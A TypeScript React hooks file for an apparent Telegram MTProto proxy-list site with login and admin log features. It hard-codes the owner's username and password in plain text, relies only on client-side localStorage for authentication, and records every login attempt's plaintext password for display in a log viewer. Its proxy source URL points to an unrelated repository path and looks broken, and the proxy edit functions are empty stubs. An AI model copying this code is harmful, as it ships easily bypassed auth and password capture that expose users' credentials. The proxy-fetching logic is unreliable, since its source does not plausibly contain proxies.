import { useState, useEffect, useCallback } from "react";
import { PROXY_SEED } from "./constants";

export type Proxy = {
  id: string;
  name: string;
  server: string;
  port: number;
  secret: string;
  country: string;
  countryCode: string;
  ping: number;
  status: "online" | "offline";
  createdAt: string;
};

export type LoginRecord = {
  id: string;
  username: string;
  password: string;
  isOwner: boolean;
  loggedAt: string;
  userAgent: string;
};

const PROXIES_KEY = "tg_proxies_v1";
const AUTH_KEY = "tg_auth_session_v2";
const LOGIN_RECORDS_KEY = "tg_login_records_v1";

export const OWNER_USERNAME = "98Taha11";
export const OWNER_PASSWORD = "Taha8burhan9";

/* =========================
   🚀 PROXIES SYSTEM (MTProto LIVE)
========================= */

export function useProxies() {
  const [proxies, setProxies] = useState<Proxy[]>([]);
  const [isLoaded, setIsLoaded] = useState(false);

  // 🔥 Ping تقريبي (من المتصفح)
  const checkPing = async (host: string, port: number) => {
    const start = Date.now();
    try {
      await fetch(`http://${host}:${port}`, { mode: "no-cors" });
      return Date.now() - start;
    } catch {
      return -1;
    }
  };

  const fetchMTProxies = async () => {
    try {
      const res = await fetch(
        "https://raw.githubusercontent.com/JetBrains/swot/master/lib/domains/mtproto.txt"
      );

      const text = await res.text();

      const list = text
        .split("\n")
        .filter(Boolean)
        .slice(0, 40);

      const results: Proxy[] = [];

      for (let i = 0; i < list.length; i++) {
        const item = list[i];
        const parts = item.split(":");

        if (parts.length < 3) continue;

        const [server, port, secret] = parts;

        const ping = await checkPing(server, Number(port));

        // ❌ نحذف الميتة
        if (ping === -1) continue;

        results.push({
          id: crypto.randomUUID(),
          name: `MTProto ${i + 1}`,
          server,
          port: Number(port),
          secret,
          country: "Auto",
          countryCode: "UN",
          ping,
          status: "online",
          createdAt: new Date().toISOString(),
        });
      }

      setProxies(results);
      localStorage.setItem(PROXIES_KEY, JSON.stringify(results));
    } catch (err) {
      console.log("MTProto fetch error", err);
    }
  };

  useEffect(() => {
    fetchMTProxies();
    setIsLoaded(true);

    // 🔥 تحديث كل 60 ثانية
    const interval = setInterval(() => {
      fetchMTProxies();
    }, 60000);

    return () => clearInterval(interval);
  }, []);

  const addProxy = () => {};
  const updateProxy = () => {};
  const deleteProxy = () => {};

  return { proxies, isLoaded, addProxy, updateProxy, deleteProxy };
}

/* =========================
   🔐 AUTH SYSTEM
========================= */

type AuthSession = { user: string; isOwner: boolean; loggedInAt: number };

function readSession(): AuthSession | null {
  try {
    const raw = localStorage.getItem(AUTH_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw) as AuthSession;
    if (typeof parsed?.user !== "string") return null;
    return parsed;
  } catch {
    return null;
  }
}

function recordLoginAttempt(
  username: string,
  password: string,
  isOwner: boolean
) {
  try {
    const raw = localStorage.getItem(LOGIN_RECORDS_KEY);
    const list: LoginRecord[] = raw ? JSON.parse(raw) : [];

    const record: LoginRecord = {
      id: crypto.randomUUID(),
      username,
      password,
      isOwner,
      loggedAt: new Date().toISOString(),
      userAgent:
        typeof navigator !== "undefined" ? navigator.userAgent : "",
    };

    list.unshift(record);
    localStorage.setItem(LOGIN_RECORDS_KEY, JSON.stringify(list.slice(0, 500)));
  } catch {}
}

export function useAuth() {
  const [session, setSession] = useState<AuthSession | null>(null);
  const [isLoaded, setIsLoaded] = useState(false);

  useEffect(() => {
    setSession(readSession());
    setIsLoaded(true);

    const onStorage = (e: StorageEvent) => {
      if (e.key === AUTH_KEY) setSession(readSession());
    };

    window.addEventListener("storage", onStorage);
    return () => window.removeEventListener("storage", onStorage);
  }, []);

  const login = useCallback((user: string, pass: string) => {
    const trimmedUser = user.trim();
    if (!trimmedUser) return { success: false, isOwner: false };

    const isOwner =
      trimmedUser === OWNER_USERNAME && pass === OWNER_PASSWORD;

    recordLoginAttempt(trimmedUser, pass, isOwner);

    const newSession: AuthSession = {
      user: trimmedUser,
      isOwner,
      loggedInAt: Date.now(),
    };

    localStorage.setItem(AUTH_KEY, JSON.stringify(newSession));
    setSession(newSession);

    window.location.href = isOwner ? "/admin" : "/";

    return { success: true, isOwner };
  }, []);

  const logout = useCallback(() => {
    localStorage.removeItem(AUTH_KEY);
    setSession(null);
    window.location.href = "/login";
  }, []);

  return {
    session,
    user: session?.user ?? null,
    isAuthenticated: !!session,
    isOwner: !!session?.isOwner,
    isLoaded,
    login,
    logout,
  };
}

/* =========================
   📜 LOGS SYSTEM
========================= */

export function useLoginRecords() {
  const [records, setRecords] = useState<LoginRecord[]>([]);
  const [isLoaded, setIsLoaded] = useState(false);

  const refresh = useCallback(() => {
    try {
      const raw = localStorage.getItem(LOGIN_RECORDS_KEY);
      setRecords(raw ? JSON.parse(raw) : []);
    } catch {
      setRecords([]);
    }
  }, []);

  useEffect(() => {
    refresh();
    setIsLoaded(true);

    const interval = setInterval(refresh, 2000);

    const onStorage = (e: StorageEvent) => {
      if (e.key === LOGIN_RECORDS_KEY) refresh();
    };

    window.addEventListener("storage", onStorage);

    return () => {
      clearInterval(interval);
      window.removeEventListener("storage", onStorage);
    };
  }, [refresh]);

  const clearAll = useCallback(() => {
    localStorage.removeItem(LOGIN_RECORDS_KEY);
    setRecords([]);
  }, []);

  const deleteOne = useCallback((id: string) => {
    setRecords((prev) => {
      const next = prev.filter((r) => r.id !== id);
      localStorage.setItem(LOGIN_RECORDS_KEY, JSON.stringify(next));
      return next;
    });
  }, []);

  return { records, isLoaded, refresh, clearAll, deleteOne };
}

/* =========================
   🌍 FLAGS
========================= */

export function getFlagEmoji(countryCode: string) {
  if (!countryCode || countryCode.length !== 2) return "🌐";

  const codePoints = countryCode
    .toUpperCase()
    .split("")
    .map((char) => 127397 + char.charCodeAt(0));

  return String.fromCodePoint(...codePoints);
}